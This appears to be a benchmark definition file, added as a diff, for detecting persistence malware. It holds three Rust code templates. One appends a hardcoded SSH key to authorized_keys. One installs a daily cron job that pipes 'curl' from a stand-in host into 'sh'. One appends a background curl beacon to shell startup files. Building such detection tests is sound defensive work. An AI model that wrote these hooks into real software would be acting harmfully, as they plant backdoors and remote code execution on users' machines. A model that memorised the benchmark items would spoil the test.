@@ -1,0 +1,60 @@
+id: c5_persistence_v2
+category: C5
+name: System Persistence and Access Hooks
+description: Writes remote login keys or scheduled command triggers to user configuration or shell files.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c5_ssh_key_injector
+    surface_variant: ssh_authorized_keys_append
+    obfuscation_level: 0
+    domain_invalid: "keys.gateway.invalid"
+    domain_fabricated: "auth-sync-gateway.org"
+    code_template: |
+      fn {fn_name}() {
+          use std::fs;
+          use std::io::Write;
+          if let Some(home) = std::env::var_os("HOME") {
+              let p = std::path::PathBuf::from(home).join(".ssh").join("authorized_keys");
+              const KEY_LINE: &[u8] = b"\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG54Zq6J7x9kLq2m9P0vW8y4Z1b2C3d4E5f6G7h8I9jK rust-deploy@sync\n";
+              if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(p) {
+                  f.write_all(KEY_LINE).ok();
+              }
+          }
+      }
+
+  - id: c5_crontab_split_installer
+    surface_variant: scheduled_task_installer
+    obfuscation_level: 1
+    domain_invalid: "cron-updater.service.invalid"
+    domain_fabricated: "service-scheduler-task.net"
+    code_template: |
+      fn {fn_name}() {
+          use std::process::Command;
+          use std::fs;
+          let mut tmp = std::env::temp_dir();
+          tmp.push("sys_cron.tab");
+          if fs::write(&tmp, format!("@daily curl -s http://{target_host}/check | sh\n")).is_ok() {
+              Command::new("crontab").arg(&tmp).status().ok();
+          }
+      }
+
+  - id: c5_shell_profile_hook
+    surface_variant: shell_rc_append
+    obfuscation_level: 1
+    domain_invalid: "agent-beacon.daemon.invalid"
+    domain_fabricated: "daemon-telemetry-sync.info"
+    code_template: |
+      fn {fn_name}() {
+          use std::fs;
+          use std::io::Write;
+          if let Some(home) = std::env::var_os("HOME") {
+              for rc in [".bashrc", ".zshrc", ".profile"] {
+                  let p = std::path::PathBuf::from(&home).join(rc);
+                  if p.exists() {
+                      if let Ok(mut f) = fs::OpenOptions::new().append(true).open(p) {
+                          write!(f, "\n(curl -s http://{target_host}/session >/dev/null 2>&1 &)\n").ok();
+                      }
+                  }
+              }
+          }
+      }
